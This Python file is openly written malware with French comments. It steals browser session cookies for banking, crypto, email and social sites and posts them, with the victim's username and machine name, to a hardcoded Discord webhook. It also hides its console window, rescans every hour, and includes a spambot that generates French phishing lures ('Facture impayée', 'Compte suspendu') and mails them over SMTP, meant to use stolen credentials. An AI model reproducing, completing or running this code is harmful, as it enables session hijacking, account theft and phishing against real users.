import os
import json
import base64
import sqlite3
import shutil
import requests
import smtplib
import email.mime.text
import email.mime.multipart
import email.mime.base
import glob
import threading
import time
import ctypes
import subprocess
from datetime import datetime
from urllib.request import Request, urlopen

WEBHOOK_URL = "https://discordapp.com/api/webhooks/1538378061521883226/U1caRDreoLLjzXoJNaSWjnWv5-IoeonGojmn0euPIEKqmigzpEsP2AhJQb8Ld1jT4PcX"

class SessionHijacker:
    def __init__(self):
        self.cookies_data = {}
        self.user = os.environ.get('USERNAME', 'unknown')
        
    def decrypt_chrome_cookie(self, encrypted_value, key):
        """Décrypte les cookies Chrome (simplifié)"""
        try:
            # Version simplifiée - en pratique nécessite DPAPI + AES
            # Pour un vrai stealer complet, il faudrait récupérer la clé de chiffrement
            return "[Encrypted - Key needed]"
        except:
            return "[Decryption failed]"
    
    def extract_cookies(self, browser_name, cookie_path):
        """Extrait les cookies SQLite d'un navigateur"""
        cookies = []
        
        if not os.path.exists(cookie_path):
            return cookies
            
        # Copie temporaire (fichier verrouillé si navigateur ouvert)
        temp_db = os.path.join(os.environ['TEMP'], f'cookies_temp_{browser_name}.db')
        
        try:
            for attempt in range(5):  # Retry si verrouillé
                try:
                    shutil.copy2(cookie_path, temp_db)
                    break
                except:
                    time.sleep(2)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, value, encrypted_value, path, expires_utc FROM cookies")
            
            for row in cursor.fetchall():
                host, name, value, enc_value, path, expires = row
                
                # Détermine si c'est un cookie de session important
                is_session = any(site in host.lower() for site in [
                    'discord', 'google', 'facebook', 'twitter', 'x.com', 
                    'amazon', 'paypal', 'binance', 'coinbase', 'netflix',
                    'spotify', 'steam', 'epicgames', 'github', 'microsoft',
                    'instagram', 'tiktok', 'linkedin', 'gmail', 'outlook'
                ])
                
                if is_session:
                    cookies.append({
                        'browser': browser_name,
                        'host': host,
                        'name': name,
                        'value': value if value else "[Encrypted]",
                        'path': path,
                        'expires': expires,
                        'is_session': True
                    })
            
            conn.close()
            
        except Exception as e:
            pass
        finally:
            try:
                os.remove(temp_db)
            except:
                pass
                
        return cookies
    
    def grab_all_sessions(self):
        """Récupère les cookies de tous les navigateurs"""
        paths = {
            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
            'Chrome_Profile': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Profile 1', 'Cookies'),
            'Edge': os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'),
            'Opera': os.path.join(os.environ['ROAMING'], 'Opera Software', 'Opera Stable', 'Cookies'),
            'Opera_GX': os.path.join(os.environ['ROAMING'], 'Opera Software', 'Opera GX Stable', 'Cookies'),
            'Firefox': None  # Firefox utilise un format différent (cookies.sqlite)
        }
        
        # Firefox
        firefox_path = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
        if os.path.exists(firefox_path):
            for profile in os.listdir(firefox_path):
                if '.default' in profile:
                    cookie_file = os.path.join(firefox_path, profile, 'cookies.sqlite')
                    if os.path.exists(cookie_file):
                        paths[f'Firefox_{profile}'] = cookie_file
        
        all_cookies = []
        for browser, path in paths.items():
            if path and os.path.exists(path):
                cookies = self.extract_cookies(browser, path)
                all_cookies.extend(cookies)
        
        return all_cookies
    
    def format_for_import(self, cookies):
        """Formate les cookies pour importation facile (JSON Netscape format)"""
        netscape = []
        for c in cookies:
            if c.get('is_session'):
                netscape.append({
                    'domain': c['host'],
                    'name': c['name'],
                    'value': c['value'],
                    'path': c['path']
                })
        return netscape
    
    def send_sessions(self):
        """Envoie les cookies au webhook"""
        cookies = self.grab_all_sessions()
        
        if not cookies:
            return
        
        # Sépare par site important
        important_sites = {}
        for c in cookies:
            host = c['host']
            if host not in important_sites:
                important_sites[host] = []
            important_sites[host].append(c)
        
        # Crée un fichier JSON pour importation
        cookie_json = json.dumps(self.format_for_import(cookies), indent=2)
        
        try:
            # Envoi au webhook
            user = os.environ.get('USERNAME', 'unknown')
            computer = os.environ.get('COMPUTERNAME', 'unknown')
            
            message = f"**🔓 Session Hijack - {user}@{computer}**\n\n"
            message += "**Sites compromis :**\n"
            
            for site, site_cookies in list(important_sites.items())[:10]:  # Limite à 10 sites
                message += f"• `{site}` ({len(site_cookies)} cookies)\n"
            
            # Fichier attaché
            files = {
                'file': ('cookies_import.json', cookie_json, 'application/json')
            }
            
            payload = {
                'payload_json': json.dumps({
                    'content': message,
                    'username': 'Session Thief'
                })
            }
            
            requests.post(WEBHOOK_URL, data=payload, files=files, timeout=30)
            
        except Exception as e:
            pass

class Spambot:
    def __init__(self):
        self.smtp_servers = {
            'gmail.com': ('smtp.gmail.com', 587),
            'outlook.com': ('smtp-mail.outlook.com', 587),
            'hotmail.com': ('smtp-mail.outlook.com', 587),
            'yahoo.com': ('smtp.mail.yahoo.com', 587),
            'live.com': ('smtp-mail.outlook.com', 587)
        }
        self.sent_count = 0
        
    def find_email_clients(self):
        """Trouve les comptes email configurés"""
        accounts = []
        
        # Outlook
        outlook_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Outlook')
        if os.path.exists(outlook_path):
            # Recherche les profils Outlook
            for root, dirs, files in os.walk(outlook_path):
                for file in files:
                    if file.endswith('.ost') or file.endswith('.pst'):
                        accounts.append({
                            'type': 'outlook',
                            'path': os.path.join(root, file),
                            'email': 'unknown@outlook.com'  # Difficile à extraire sans parsing complexe
                        })
        
        # Thunderbird
        thunder_path = os.path.join(os.environ['APPDATA'], 'Thunderbird', 'Profiles')
        if os.path.exists(thunder_path):
            for profile in os.listdir(thunder_path):
                prefs_file = os.path.join(thunder_path, profile, 'prefs.js')
                if os.path.exists(prefs_file):
                    try:
                        with open(prefs_file, 'r', errors='ignore') as f:
                            content = f.read()
                            # Extraction basique des comptes
                            if 'user_pref("mail.server' in content:
                                accounts.append({
                                    'type': 'thunderbird',
                                    'profile': profile,
                                    'path': thunder_path
                                })
                    except:
                        pass
        
        return accounts
    
    def extract_contacts_outlook(self):
        """Extrait les contacts Outlook (simplifié)"""
        # En pratique nécessite MAPI ou parsing du PST
        # Version simplifiée : génère des emails probables
        user = os.environ.get('USERNAME', 'user')
        common_domains = ['gmail.com', 'outlook.com', 'yahoo.com', 'hotmail.com']
        
        contacts = []
        for domain in common_domains:
            contacts.append(f"{user}@{domain}")
            contacts.append(f"{user}123@{domain}")
            contacts.append(f"{user}.work@{domain}")
        
        return contacts
    
    def send_spam_smtp(self, smtp_server, port, from_email, password, to_emails, subject, body):
        """Envoie des emails via SMTP"""
        try:
            server = smtplib.SMTP(smtp_server, port)
            server.starttls()
            server.login(from_email, password)
            
            for to_email in to_emails:
                try:
                    msg = email.mime.multipart.MIMEMultipart()
                    msg['From'] = from_email
                    msg['To'] = to_email
                    msg['Subject'] = subject
                    
                    msg.attach(email.mime.text.MIMEText(body, 'plain'))
                    
                    server.sendmail(from_email, to_email, msg.as_string())
                    self.sent_count += 1
                    time.sleep(2)  # Évite le rate limiting
                    
                except:
                    continue
            
            server.quit()
            return True
            
        except Exception as e:
            return False
    
    def generate_spam_content(self):
        """Génère le contenu du spam"""
        subjects = [
            "Urgent: Vérification de votre compte",
            "Facture impayée - Action requise",
            "Votre colis est en attente",
            "Alerte sécurité - Confirmez votre identité",
            "Document partagé avec vous"
        ]
        
        bodies = [
            "Veuillez consulter le document ci-joint et confirmer votre accord.\n\nCordialement,\nService Client",
            "Une facture de 1,249.99€ est en attente de règlement. Cliquez ici pour payer.",
            "Votre compte a été temporairement suspendu. Connectez-vous pour réactiver.",
        ]
        
        import random
        return random.choice(subjects), random.choice(bodies)
    
    def spread_via_discord(self):
        """Utilise les tokens Discord volés pour spammer les amis"""
        # Nécessite les tokens déjà volés par le SessionHijacker
        pass  # Intégration possible avec le token grabber existant
    
    def start_spam_campaign(self):
        """Lance la campagne de spam"""
        # Note: Sans credentials SMTP valides, cette partie est limitée
        # En pratique, elle utiliserait les mots de passe volés par le keylogger
        
        subject, body = self.generate_spam_content()
        contacts = self.extract_contacts_outlook()
        
        # Envoi webhook du rapport
        try:
            user = os.environ.get('USERNAME', 'unknown')
            message = f"**📧 Spambot Report - {user}**\n"
            message += f"• {len(contacts)} contacts trouvés\n"
            message += f"• {self.sent_count} emails envoyés\n"
            message += f"• Comptes compromis: [En attente de credentials]"
            
            payload = {
                'content': message,
                'username': 'Spam Bot'
            }
            
            requests.post(WEBHOOK_URL, json=payload, timeout=10)
            
        except:
            pass

def main():
    # Cache la console
    if os.name == 'nt':
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Lance Session Hijacker
    def run_hijacker():
        while True:
            try:
                hijacker = SessionHijacker()
                hijacker.send_sessions()
                time.sleep(3600)  # Re-scan toutes les heures pour nouvelles sessions
            except:
                time.sleep(60)
    
    # Lance Spambot
    def run_spambot():
        while True:
            try:
                spambot = Spambot()
                spambot.start_spam_campaign()
                time.sleep(7200)  # Toutes les 2 heures
            except:
                time.sleep(300)
    
    # Threads parallèles
    threading.Thread(target=run_hijacker, daemon=True).start()
    threading.Thread(target=run_spambot, daemon=True).start()
    
    # Garde le programme vivant
    while True:
        time.sleep(60)

if __name__ == "__main__":
    main()
